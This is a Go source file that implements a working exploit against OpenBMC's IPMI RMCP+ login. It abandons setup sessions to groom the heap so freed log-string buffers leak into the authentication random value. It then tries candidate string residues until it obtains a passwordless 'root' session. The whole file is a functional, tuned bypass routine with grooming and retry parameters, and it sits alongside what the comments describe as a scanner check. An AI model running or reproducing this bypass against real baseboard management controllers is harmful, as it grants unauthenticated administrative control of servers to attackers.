package ipmi

import (
	"encoding/binary"
	"fmt"
	"strings"
	"time"
)

// This file is the single source of truth for the OpenBMC default-userKey
// constant-string residues and the heap grooming that manufactures them. Both
// the scan check (pkg/check) and the ipmi subcommand's bypass path draw from it,
// so the two never drift apart. See OpenSession20OpenBMCBypassFast for the
// seedless fast path and pkg/check for the finding-producing sweep.

// OpenBMCLogStringTemplate is the phosphor-logging format literal whose freed
// formatting buffer is reused for the AlgoSHA256 auth object: cleanStaleEntries()
// logs it at the start of a startSession() that follows a stale session, freeing
// the buffer into the tcache bin the next auth object allocates from, so
// bmc-random inherits a 16-byte window of this string (window template[12:28)).
const OpenBMCLogStringTemplate = "Removing idle IPMI LAN session, id: {ID}, handler: {HANDLE}"

// openBMCResidueSourceStrings are the constant strings whose freed buffers have
// been seen reused for the auth object. Any 16-byte window of one is a plausible
// residue, so every 4-byte-aligned window is a cold candidate.
var openBMCResidueSourceStrings = []string{
	OpenBMCLogStringTemplate,
	"/xyz/openbmc_project",
	"/xyz/openbmc_project/ipmi/session",
	"/ipmi/session/eth0",
	"/xyz/openbmc_project/user/root",
	"/xyz/openbmc_project/network/eth0",
	"/xyz/openbmc_project/state/host0",
	"/xyz/openbmc_project/logging",
}

// OpenBMCHotResidues returns the constant-string residues observed to activate a
// session; they are tried every round of the fast path. Each attempt tests one
// candidate against one fresh session's residue, so padding the rotation with
// never-observed windows does not raise the per-attempt hit chance -- it just
// spends attempts on values the target never produces.
func OpenBMCHotResidues() [][]byte {
	return dedupResidues16([][]byte{
		[]byte("e IPMI LAN sessi"),
		[]byte("/xyz/openbmc_pro"),
		[]byte("/ipmi/session/et"),
	})
}

// OpenBMCColdResidues returns every 4-byte-aligned 16-byte window of every known
// source string, minus the hot ones: the coverage tier that hedges against a
// build whose freed buffer lands at a different offset, including the rest of the
// phosphor-logging template that OpenBMCHotResidues samples only one window of.
func OpenBMCColdResidues() [][]byte {
	hot := map[string]bool{}
	for _, h := range OpenBMCHotResidues() {
		hot[string(h)] = true
	}
	var out [][]byte
	for _, s := range openBMCResidueSourceStrings {
		for off := 0; off+16 <= len(s); off += 4 {
			if w := s[off : off+16]; !hot[w] {
				out = append(out, []byte(w))
			}
		}
	}
	return dedupResidues16(out)
}

// OpenBMCConstantResidues returns the full constant-string residue set, hot
// values first, prefixed with the cold-boot all-zero value.
func OpenBMCConstantResidues() [][]byte {
	all := append([][]byte{make([]byte, 16)}, OpenBMCHotResidues()...)
	all = append(all, OpenBMCColdResidues()...)
	return dedupResidues16(all)
}

func dedupResidues16(in [][]byte) [][]byte {
	var out [][]byte
	seen := map[string]bool{}
	for _, b := range in {
		if len(b) != 16 || seen[string(b)] {
			continue
		}
		seen[string(b)] = true
		out = append(out, append([]byte(nil), b...))
	}
	return out
}

// GroomAbandonSetupSession opens one setup session and walks away: RAKP1 but no
// RAKP3, no Close Session, socket dropped. The session sits on the target until
// its stale timer expires, at which point the next startSession() logs the
// idle-session template and frees that formatting buffer into the tcache bin the
// next auth object draws from, manufacturing the hot residue instead of awaiting.
// Returns true if the target accepted the session; callers ignore a failure.
func GroomAbandonSetupSession(host string, port int, suite CipherAlgos, timeout time.Duration, cSID uint32) bool {
	c, err := NewClient(host, port, timeout)
	if err != nil {
		return false
	}
	defer c.Close() // drops our socket; the BMC-side session stays until stale
	var os = openSessionRequestBody(cSID, suite, 0x04)
	resp, err := c.Send(buildRMCPPlus(PayloadOpenSessionReq, 0, 0, os))
	if err != nil {
		return false
	}
	bmcSID, err := parseOpenSessionResp(resp)
	if err != nil || bmcSID == 0 {
		return false
	}
	clientRand := make([]byte, 16)
	for i := range clientRand {
		clientRand[i] = byte(0xE0 + i)
	}
	_, _ = c.Send(buildRMCPPlus(PayloadRAKP1, 0, 0, openBMCRAKP1Body(bmcSID, clientRand, cSID, "root", 0x01)))
	return true
}

// openSessionRequestBody builds the RMCP+ Open Session Request body for the
// given client SID / suite / requested privilege.
func openSessionRequestBody(cSID uint32, suite CipherAlgos, reqPriv byte) []byte {
	b := make([]byte, 0, 32)
	b = append(b, 0x00, reqPriv&0x0f, 0x00, 0x00)
	b = binary.LittleEndian.AppendUint32(b, cSID)
	b = append(b, 0x00, 0x00, 0x00, 0x08, suite.Auth, 0, 0, 0)
	b = append(b, 0x01, 0x00, 0x00, 0x08, suite.Integrity, 0, 0, 0)
	b = append(b, 0x02, 0x00, 0x00, 0x08, suite.Conf, 0, 0, 0)
	return b
}

// openBMCRAKP1Body builds a RAKP Message 1 body naming username at reqPriv.
func openBMCRAKP1Body(bmcSID uint32, clientRand []byte, _ uint32, username string, reqPriv byte) []byte {
	b := make([]byte, 0, 28+len(username))
	b = append(b, 0x00, 0x00, 0x00, 0x00)
	b = binary.LittleEndian.AppendUint32(b, bmcSID)
	b = append(b, clientRand...)
	b = append(b, reqPriv&0x0f, 0x00, 0x00)
	b = append(b, byte(len(username)))
	b = append(b, username...)
	return b
}

// OpenBMCBypassFastOptions parameterizes the seedless fast-path bypass opener.
type OpenBMCBypassFastOptions struct {
	Host     string
	Port     int
	Username string // enabled account named in RAKP1; default "root"
	Suite    CipherAlgos
	Timeout  time.Duration
	// Rounds is how many times the hot residue set is re-rolled. The residue is
	// drawn fresh per session, so each round is an independent trial. 0 = default.
	Rounds int
	Log    func(string)
}

// Fast-path defaults, matched to the scan check so both paths behave alike.
const (
	openBMCFastRoundsDefault = 96 // hot-set re-rolls before giving up
	openBMCFastColdEvery     = 8  // fold the cold window set into every Nth round
	openBMCFastGroomEvery    = 4  // abandon a batch every Nth round
	openBMCFastGroomBatch    = 3  // sessions abandoned per groom
	openBMCFastGroomMax      = 24 // total abandoned per run (bounds setup-slot use)
)

// OpenSession20OpenBMCBypassFast opens a passwordless OpenBMC default-userKey
// session without a supplied stale value. It re-rolls the constant-string residues
// -- confirmed values every round, the exhaustive windows periodically -- while
// grooming the target (abandoning sessions to drive cleanStaleEntries) so the hot
// template residue is manufactured rather than awaited. A per-attempt transport
// timeout is retried within the round budget instead of aborting. Returns the
// first activated session, or an error after exhausting Rounds.
func OpenSession20OpenBMCBypassFast(o OpenBMCBypassFastOptions) (*Session20, error) {
	if strings.TrimSpace(o.Host) == "" {
		return nil, fmt.Errorf("host is required")
	}
	if o.Port <= 0 {
		o.Port = DefaultPort
	}
	if o.Timeout <= 0 {
		o.Timeout = 5 * time.Second
	}
	if strings.TrimSpace(o.Username) == "" {
		o.Username = "root"
	}
	if o.Suite.Auth == RAKPNone {
		return nil, fmt.Errorf("openbmc bypass requires an authenticated cipher suite (not cipher-zero)")
	}
	rounds := o.Rounds
	if rounds <= 0 {
		rounds = openBMCFastRoundsDefault
	}
	logf := func(format string, args ...any) {
		if o.Log != nil {
			o.Log(fmt.Sprintf(format, args...))
		}
	}

	hot := OpenBMCHotResidues()
	hot = append([][]byte{make([]byte, 16)}, hot...) // cold-boot all-zero, tried each round
	cold := OpenBMCColdResidues()
	logf("openbmc fast: %d hot + %d cold residues, %d rounds (cold every %d, groom every %d up to %d)",
		len(hot), len(cold), rounds, openBMCFastColdEvery, openBMCFastGroomEvery, openBMCFastGroomMax)

	attempts, groomed := 0, 0
	var lastErr error
	for round := 0; round < rounds; round++ {
		// Manufacture the residue: age a few abandoned sessions into
		// cleanStaleEntries(), whose log frees the template buffer into the bin
		// the next auth object allocates from.
		if openBMCFastGroomEvery > 0 && round%openBMCFastGroomEvery == 0 && groomed < openBMCFastGroomMax {
			for range openBMCFastGroomBatch {
				if groomed >= openBMCFastGroomMax {
					break
				}
				GroomAbandonSetupSession(o.Host, o.Port, o.Suite, o.Timeout, 0x60000000|uint32(groomed))
				groomed++
			}
		}
		set := hot
		if openBMCFastColdEvery > 0 && round%openBMCFastColdEvery == openBMCFastColdEvery-1 {
			set = append(append([][]byte{}, hot...), cold...)
		}
		for _, cand := range set {
			attempts++
			s, err := OpenSession20OpenBMCBypass(o.Host, o.Port, o.Username, cand, o.Suite, o.Timeout)
			if err == nil {
				logf("openbmc fast: activated round=%d attempt=%d bmcrand=%x (%q)",
					round+1, attempts, cand, printableResidueText(cand))
				return s, nil
			}
			lastErr = err
			// A residue mismatch (rakp4=0x0f) and a transport timeout are both
			// "try again": the residue re-rolls per session and the caller asked
			// to keep retrying to get a session. Any other hard error aborts.
			if !isRetryableBypassErr(err) {
				return nil, err
			}
		}
	}
	// The per-attempt "supplied bmc-random" wording does not apply here (the fast
	// path supplies no value): a trailing mismatch means the residue never landed
	// within the round budget; any other last error is surfaced verbatim.
	reason := "residue never matched a known value within the round budget (raise --openbmc-rounds, or the target may not be reachable this way)"
	if lastErr != nil && !strings.Contains(strings.ToLower(lastErr.Error()), "does not match") {
		reason = lastErr.Error()
	}
	return nil, fmt.Errorf("openbmc fast bypass: no session after %d attempts across %d rounds: %s", attempts, rounds, reason)
}

// isRetryableBypassErr reports whether a bypass attempt error is worth another
// try: a residue mismatch (the value re-rolls per session) or a transport
// timeout (packet loss). Everything else is a hard error that aborts the loop.
func isRetryableBypassErr(err error) bool {
	if err == nil {
		return false
	}
	msg := strings.ToLower(err.Error())
	return strings.Contains(msg, "does not match") ||
		strings.Contains(msg, "timeout") ||
		strings.Contains(msg, "i/o timeout") ||
		strings.Contains(msg, "deadline exceeded")
}

// printableResidueText renders a residue for logging when it is ASCII text
// (which names the source string the heap chunk last held); "" otherwise.
func printableResidueText(b []byte) string {
	for _, c := range b {
		if c < 0x20 || c > 0x7e {
			return ""
		}
	}
	return string(b)
}
